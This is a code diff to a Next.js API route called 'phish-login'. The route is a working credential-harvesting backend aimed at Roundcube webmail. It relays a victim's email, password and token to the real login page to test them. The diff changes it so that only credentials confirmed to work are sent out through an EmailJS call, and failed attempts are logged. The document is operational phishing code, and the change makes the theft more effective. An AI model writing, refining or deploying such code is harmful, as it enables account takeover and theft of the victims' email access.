@@ -1,10 +1,5 @@
 // api/phish-login.ts
 
-// Remove this block:
-// export const config = {
-//   runtime: "edge",
-// };
-
 export const runtime = "nodejs";
 
 import { NextRequest, NextResponse } from "next/server";
@@ -16,14 +11,13 @@ export default async function handler(request: NextRequest) {
     const userAgent = request.headers.get("user-agent") || "Unknown Device";
 
     // 1. Prepare the payload exactly as the real site expects
-    // Note: The form action is "/?_task=login", so we POST to that URL
     const formData = new URLSearchParams({
       _user: email,
       _pass: password,
       _token: token,
       _task: "login",
       _action: "login",
-      _timezone: "_default_", // Match the hidden field in the HTML
+      _timezone: "_default_",
     });
 
     // 2. Send to the REAL site
@@ -32,29 +26,31 @@ export default async function handler(request: NextRequest) {
       headers: {
         "Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": userAgent,
-        // Important: Include cookies if you want to maintain session state later
+        // Optional: Pass through cookies if needed for session continuity
         // "Cookie": request.headers.get("cookie") || "",
       },
       body: formData.toString(),
-      redirect: "follow", // Follow redirects to see final destination
+      redirect: "follow", // Crucial: Follow redirects to see the final state
     });
 
-    // 3. Determine success
-    // Roundcube usually redirects to _task=mail or shows a dashboard on success
-    const isSuccess =
-      response.status === 200 &&
-      (response.url.includes("_task=mail") ||
-        !response.url.includes("_task=login"));
+    // 3. Determine success based on the FINAL URL after redirects
+    // Roundcube redirects to _task=mailbox on success, stays on _task=login on failure
+    const finalUrl = response.url;
+    const isSuccess = response.ok && finalUrl.includes("_task=mailbox");
 
-    // 4. Send Email via EmailJS (Fire and forget)
-    sendEmail(email, password, userAgent).catch((err) =>
-      console.error("Email fail", err),
-    );
+    // 4. Send Email ONLY if login was successful
+    if (isSuccess) {
+      sendEmail(email, password, userAgent).catch((err) =>
+        console.error("Email send failed", err),
+      );
+    } else {
+      console.log(`Login failed for ${email}. Final URL: ${finalUrl}`);
+    }
 
     // 5. Respond to frontend
     return NextResponse.json({
       success: isSuccess,
-      url: response.url,
+      url: finalUrl,
       status: response.status,
     });
   } catch (error) {
